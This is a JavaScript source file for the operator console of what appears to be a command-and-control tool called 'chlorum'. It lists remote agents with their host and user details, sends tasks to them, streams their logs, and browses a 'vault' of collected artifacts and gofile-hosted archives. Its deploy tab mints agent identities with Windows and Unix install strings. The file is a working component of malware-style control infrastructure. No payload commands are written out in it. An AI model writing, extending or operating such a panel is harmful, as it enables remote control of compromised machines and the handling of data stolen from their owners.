// chlorum console — operator UI
// vanilla JS, no build step, no dependencies.

"use strict";

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => [...document.querySelectorAll(sel)];

const state = {
  operator: null,
  agents: [],
  taskTypes: [],
  logAfter: 0,
  pollTimers: {},
};

async function api(path, opts = {}) {
  const res = await fetch(path, {
    credentials: "include",
    headers: opts.body ? { "content-type": "application/json" } : {},
    ...opts,
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  });
  if (res.status === 401) {
    location.href = "/login.html";
    throw new Error("session lost");
  }
  const json = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(json.error || `http ${res.status}`);
  return json;
}

function fmtBytes(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

function fmtTime(iso) {
  if (!iso) return "—";
  return new Date(iso).toLocaleString();
}

function seenWithin(iso, ms) {
  return iso && (Date.now() - new Date(iso).getTime()) < ms;
}

// ---------- tabs ----------

$$(".tab").forEach((tab) => {
  tab.addEventListener("click", () => {
    $$(".tab").forEach((t) => t.classList.remove("active"));
    $$(".view").forEach((v) => v.classList.remove("active"));
    tab.classList.add("active");
    $(`#view-${tab.dataset.view}`).classList.add("active");
    Object.values(state.pollTimers).forEach(clearInterval);
    state.pollTimers = {};
    startView(tab.dataset.view);
  });
});

function startView(view) {
  if (view === "nodes") {
    refreshAgents();
    state.pollTimers.nodes = setInterval(refreshAgents, 5000);
  } else if (view === "tasks") {
    refreshAgents().then(fillTaskAgentSelect);
    refreshTaskTable();
    state.pollTimers.tasks = setInterval(refreshTaskTable, 5000);
  } else if (view === "logs") {
    refreshAgents().then(fillLogAgentSelect);
    state.logAfter = 0;
    $("#log-stream").innerHTML = "";
    pullLogs();
    state.pollTimers.logs = setInterval(pullLogs, 3000);
  } else if (view === "vault") {
    refreshAgents().then(fillVaultAgentSelect);
    refreshVault();
    state.pollTimers.vault = setInterval(refreshVault, 8000);
  } else if (view === "archive") {
    refreshArchive();
  }
}

// ---------- nodes ----------

async function refreshAgents() {
  const { agents } = await api("/api/agents");
  state.agents = agents;
  const grid = $("#agent-grid");
  grid.innerHTML = "";
  if (agents.length === 0) {
    grid.innerHTML = `<div class="empty">no nodes registered. mint an identity under <b>deploy</b>.</div>`;
    return agents;
  }
  for (const a of agents) {
    const live = seenWithin(a.lastSeen, 45_000);
    const card = document.createElement("div");
    card.className = `card agent ${live ? "live" : "dim"}`;
    card.innerHTML = `
      <div class="card-head">
        <span class="pulse-dot ${live ? "" : "off"}"></span>
        <b>${a.id}</b>
      </div>
      <div class="kv"><span>host</span><span>${esc(a.profile.host || "—")}</span></div>
      <div class="kv"><span>os</span><span>${esc(a.profile.os)} ${esc(a.profile.osVersion)}</span></div>
      <div class="kv"><span>arch</span><span>${esc(a.profile.arch)}</span></div>
      <div class="kv"><span>user</span><span>${esc(a.profile.user)}</span></div>
      <div class="kv"><span>logs</span><span>${a.stats.logs}</span></div>
      <div class="kv"><span>vault</span><span>${fmtBytes(a.stats.bytes)}</span></div>
      <div class="kv"><span>last seen</span><span>${fmtTime(a.lastSeen)}</span></div>
    `;
    grid.appendChild(card);
  }
  return agents;
}

function esc(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])
  );
}

// ---------- tasks ----------

function fillTaskAgentSelect() {
  const sel = $("#task-agent");
  sel.innerHTML = state.agents.map((a) => `<option value="${esc(a.id)}">${esc(a.id)}</option>`).join("");
}

async function refreshTaskTable() {
  const { tasks } = await api("/api/tasks");
  state.taskRows = tasks;
  const tbody = $("#task-table tbody");
  tbody.innerHTML =
    tasks
      .map(
        (t, i) => `<tr>
        <td>${esc(t.agentId)}</td>
        <td class="mono"><a href="#" class="link" data-task="${i}">${esc(t.id)}</a></td>
        <td>${esc(t.type)}</td>
        <td class="${t.state === "error" ? "crit" : t.state === "done" ? "ok" : ""}">${esc(t.state)}</td>
        <td>${fmtTime(t.issued)}</td>
      </tr>`
      )
      .join("") || `<tr><td colspan="5" class="hint">no tasks yet.</td></tr>`;
  $$("a[data-task]").forEach((a) => {
    a.onclick = (ev) => {
      ev.preventDefault();
      openTaskResult(state.taskRows[Number(a.dataset.task)]);
    };
  });
}

function openTaskResult(task) {
  if (!task) return;
  $("#task-title").textContent = `${task.id} — ${task.type} — ${task.state}`;
  $("#task-result").textContent = JSON.stringify(
    { args: task.args, ...task.result },
    null,
    2
  );
  $("#task-modal").classList.remove("hidden");
}

$("#task-close").addEventListener("click", () => $("#task-modal").classList.add("hidden"));

$("#btn-inject").addEventListener("click", async () => {
  const agentId = $("#task-agent").value;
  const type = $("#task-type").value;
  let args = {};
  const raw = $("#task-args").value.trim();
  if (raw) {
    try {
      args = JSON.parse(raw);
    } catch {
      $("#task-feedback").textContent = "args is not valid JSON";
      return;
    }
  }
  try {
    await api(`/api/agents/${encodeURIComponent(agentId)}/tasks`, { method: "POST", body: { type, args } });
    $("#task-feedback").textContent = "injected ✓";
    refreshTaskTable();
  } catch (err) {
    $("#task-feedback").textContent = err.message;
  }
});

// ---------- logs ----------

function fillVaultAgentSelect() {
  const sel = $("#vault-agent");
  const current = sel.value;
  sel.innerHTML = `<option value="">all</option>` +
    state.agents.map((a) => `<option value="${esc(a.id)}">${esc(a.id)}</option>`).join("");
  sel.value = current;
}

function fillLogAgentSelect() {
  const sel = $("#log-agent");
  const current = sel.value;
  sel.innerHTML = `<option value="">all</option>` +
    state.agents.map((a) => `<option value="${esc(a.id)}">${esc(a.id)}</option>`).join("");
  sel.value = current;
}

$("#log-agent").addEventListener("change", () => {
  state.logAfter = 0;
  $("#log-stream").innerHTML = "";
  pullLogs();
});

async function pullLogs() {
  const agent = $("#log-agent").value;
  const { logs } = await api(`/api/logs?after=${state.logAfter}${agent ? `&agent=${encodeURIComponent(agent)}` : ""}`);
  if (!logs.length) return;
  const stream = $("#log-stream");
  for (const l of logs) {
    state.logAfter = Math.max(state.logAfter, l.seq);
    const row = document.createElement("div");
    row.className = `log-line ${l.severity}`;
    row.innerHTML = `<span class="t">${fmtTime(l.ts)}</span><span class="k">[${esc(l.kind)}]</span><span>${esc(l.text)}</span>`;
    stream.appendChild(row);
  }
  while (stream.children.length > 400) stream.removeChild(stream.firstChild);
  stream.scrollTop = stream.scrollHeight;
}

// ---------- vault ----------

async function refreshVault() {
  const agent = $("#vault-agent")?.value || "";
  const { artifacts } = await api(`/api/vault${agent ? `?agent=${encodeURIComponent(agent)}` : ""}`);
  const tbody = $("#vault-table tbody");
  $("#vault-table").style.display = artifacts.length ? "" : "none";
  tbody.innerHTML = artifacts
    .map(
      (a) => `<tr>
        <td>${esc(a.agentId)}</td>
        <td class="mono">${esc(a.name)}</td>
        <td>${esc(a.kind)}</td>
        <td>${fmtBytes(a.bytes)}</td>
        <td>${fmtTime(a.at)}</td>
        <td><button class="btn ghost" data-open="${esc(a.name)}">open</button></td>
      </tr>`
    )
    .join("");
  $$("button[data-open]").forEach((b) => {
    b.onclick = () => openVault(b.dataset.open);
  });
}

async function openVault(name) {
  const data = await api(`/api/vault/${encodeURIComponent(name)}`);
  $("#vault-title").textContent = `${data.name} — ${fmtBytes(data.bytes)} — ${fmtTime(data.at)}`;
  $("#vault-preview").textContent = data.preview + (data.truncated ? "\n\n… truncated preview (download for full contents)" : "");
  $("#vault-download").href = `/api/vault/${encodeURIComponent(name)}?raw=1`;
  $("#vault-modal").classList.remove("hidden");
}

$("#vault-close").addEventListener("click", () => $("#vault-modal").classList.add("hidden"));

// ---------- archive ----------

async function refreshArchive() {
  const { archive } = await api("/api/gofile");
  const tbody = $("#archive-table tbody");
  $("#archive-empty").style.display = archive.length ? "none" : "";
  tbody.innerHTML = archive
    .map(
      (g) => `<tr>
        <td>${fmtTime(g.at)}</td>
        <td class="mono">${esc(g.name)}</td>
        <td>${fmtBytes(g.size)}</td>
        <td><a class="link" href="${esc(g.downloadPage)}" target="_blank" rel="noopener">${esc(g.downloadPage)}</a></td>
      </tr>`
    )
    .join("");
}

// ---------- deploy ----------

$("#btn-mint").addEventListener("click", async () => {
  const d = await api("/api/mint", { method: "POST" });
  $("#mint-taskid").textContent = d.taskId;
  $("#mint-windows").textContent = d.windows;
  $("#mint-unix").textContent = d.unix;
  $("#mint-output").classList.remove("hidden");
});

// ---------- boot ----------

$("#btn-logout").addEventListener("click", async () => {
  await fetch("/api/auth/logout", { method: "POST" });
  location.href = "/login.html";
});

(async function boot() {
  try {
    const me = await api("/api/auth/me");
    state.operator = me;
    $("#operator-label").textContent = `${me.email} · ${me.role}`;
    startView("nodes");
  } catch {
    /* api() already redirected on 401 */
  }
})();
